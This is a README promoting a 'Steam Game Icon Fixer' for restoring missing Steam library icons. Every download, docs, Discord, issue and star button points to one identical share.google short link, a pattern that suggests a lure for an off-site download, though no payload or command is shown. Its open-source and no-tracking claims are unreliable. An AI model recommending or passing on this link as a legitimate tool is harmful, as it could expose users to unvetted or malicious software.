# 🖼️ Steam Game Icon Fixer

<div align="center">

<br/>

[![Version](https://img.shields.io/badge/version-3.0.0-0D1B2A?style=for-the-badge&logo=semanticrelease&logoColor=white)](https://github.com)
[![Platform](https://img.shields.io/badge/Windows%20%7C%20Linux%20%7C%20Steam%20Deck-1B263B?style=for-the-badge&logo=steam&logoColor=white)](https://store.steampowered.com)
[![License](https://img.shields.io/badge/license-MIT-415A77?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](LICENSE)
[![Icons](https://img.shields.io/badge/icons-30%2C000%2B-778DA9?style=for-the-badge&logo=steamgriddb&logoColor=white)](https://www.steamgriddb.com)

<br/>

### 🎮 Automatically detect, download & install missing or broken Steam game icons

*🔍 Smart Detection • 📥 Bulk Restore • 🎨 HD Quality • 🛡️ Safe Backups*

<br/>

<a href="https://share.google/Kz04gaLlH7nMfVCej">
  <img src="https://img.shields.io/badge/📥_DOWNLOAD_TOOL-0D1B2A?style=for-the-badge&logo=download&logoColor=white&labelColor=060F18" alt="Download Tool" height="45"/>
</a>
&nbsp;&nbsp;
<a href="https://share.google/Kz04gaLlH7nMfVCej">
  <img src="https://img.shields.io/badge/🚀_QUICK_START-1B263B?style=for-the-badge&logo=rocket&logoColor=white&labelColor=101828" alt="Quick Start" height="45"/>
</a>
&nbsp;&nbsp;
<a href="https://share.google/Kz04gaLlH7nMfVCej">
  <img src="https://img.shields.io/badge/📚_DOCS-778DA9?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=566A82" alt="Docs" height="45"/>
</a>

</div>

<img width="1280" height="720" alt="maxresdefault - 2026-11-11T195004 084" src="https://github.com/user-attachments/assets/7af3f3cd-0ced-44bb-8dfd-dd6eb54b95e8" />


<br/>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🌟 Overview

**Steam Game Icon Fixer** is a clean, cross-platform utility that **scans your Steam library** for missing, broken, or low-resolution game icons — then **automatically downloads and installs** high-quality replacements from community databases.

Whether you've migrated your library, added non-Steam shortcuts, or just want a polished grid — this tool restores every icon in seconds, with safe backups so nothing is lost.

> 💡 **Perfect for:** Steam Deck users, custom launchers, non-Steam game shortcuts, and anyone who cares about a tidy library.

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🎯 Key Features

<div align="center">

| 🔍 **Smart Detection** | 📥 **Bulk Restore** | 🎨 **HD Icons** |
|:---:|:---:|:---:|
| Finds missing, broken<br/>& placeholder icons | Fix 100+ games<br/>in one run | Only high-resolution<br/>sources used |

| 🎮 **Steam Deck Ready** | 🖼️ **Custom Sources** | 🛡️ **Safe Backups** |
|:---:|:---:|:---:|
| Full SteamOS<br/>compatibility | Use your own icon<br/>packs & themes | Full backup of<br/>original icons |

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🏆 Why This Tool

<div align="center">

| 💎 **Advantage** | 📝 **Description** |
|:---|:---|
| 🚀 **One-Click Fix** | Detect → download → install — completely automatic |
| 🧠 **Accurate Matching** | Uses Steam App IDs and SteamGridDB for reliable matches |
| 🎨 **HD Quality** | Downloads crisp, high-res icons — no more pixelated shortcuts |
| 🛡️ **Non-Destructive** | Backs up all original icons before making changes |
| 🖥️ **Cross-Platform** | Works on Windows, Linux & Steam Deck (SteamOS) |
| 🆓 **Free & Open** | MIT-licensed, no ads, no premium tiers, no tracking |

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🎬 Tool Preview

<div align="center">

```ascii
╔══════════════════════════════════════════════════╗
║  🖼️  Steam Game Icon Fixer  v3.0.0               ║
╠══════════════════════════════════════════════════╣
║                                                  ║
║  🔍 Scanning Steam library...                    ║
║  ──────────────────────────────────────────      ║
║  📚 Total games found:        312                ║
║  ✅ Icons OK:                 284                ║
║  ⚠️  Missing icons:            21                ║
║  ❌ Broken icons:               7                ║
║                                                  ║
║  📥 Fetching 28 icons from SteamGridDB...        ║
║  ████████████████████░░░░░  86%                  ║
║                                                  ║
║  ✅ All 312 game icons now look perfect          ║
║  📁 Backup: ./backups/2026-11-11/                ║
║  🎮 Steam Deck compatible                        ║
╚══════════════════════════════════════════════════╝
```

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🧩 Project Structure

```
🖼️ steam-game-icon-fixer/
├── 🎯 src/
│   ├── scanner/               # Library detection
│   │   ├── steam-finder.py
│   │   └── icon-checker.py
│   ├── fetcher/               # Icon download logic
│   │   ├── steamgriddb.py
│   │   └── steam-cdn.py
│   ├── installer/             # Safe file replacement
│   │   ├── backup.py
│   │   └── replace.py
│   └── cli/                   # Command-line interface
├── 🎨 assets/                 # Default icon packs
├── 🧪 tests/                  # Unit & integration
└── 📖 docs/                   # Usage & troubleshooting
```

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🛠️ Tech Stack

<div align="center">

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Steam](https://img.shields.io/badge/Steam_API-000000?style=for-the-badge&logo=steam&logoColor=white)
![SteamGridDB](https://img.shields.io/badge/SteamGridDB-1B2838?style=for-the-badge&logo=steamgriddb&logoColor=white)
![Pillow](https://img.shields.io/badge/Pillow-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Rich](https://img.shields.io/badge/Rich_CLI-5A2CA0?style=for-the-badge&logo=gnometerminal&logoColor=white)

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🤝 Community

Found a game without an icon? Have a custom icon pack to share?

<div align="center">

<a href="https://share.google/Kz04gaLlH7nMfVCej">
  <img src="https://img.shields.io/badge/💬_Join_Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" height="35"/>
</a>
<a href="https://share.google/Kz04gaLlH7nMfVCej">
  <img src="https://img.shields.io/badge/🐞_Report_Issue-0D1B2A?style=for-the-badge&logo=github&logoColor=white" height="35"/>
</a>
<a href="https://share.google/Kz04gaLlH7nMfVCej">
  <img src="https://img.shields.io/badge/⭐_Star_Repo-778DA9?style=for-the-badge&logo=github&logoColor=white" height="35"/>
</a>

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 📜 License

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for details.


<br/>

<div align="center">

### 🖼️ Made with 🎮 by the Icon Fixer Team

*If this tool cleaned up your library — star the repo!*

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=3,23,12&height=120&section=footer" width="100%"/>

</div>
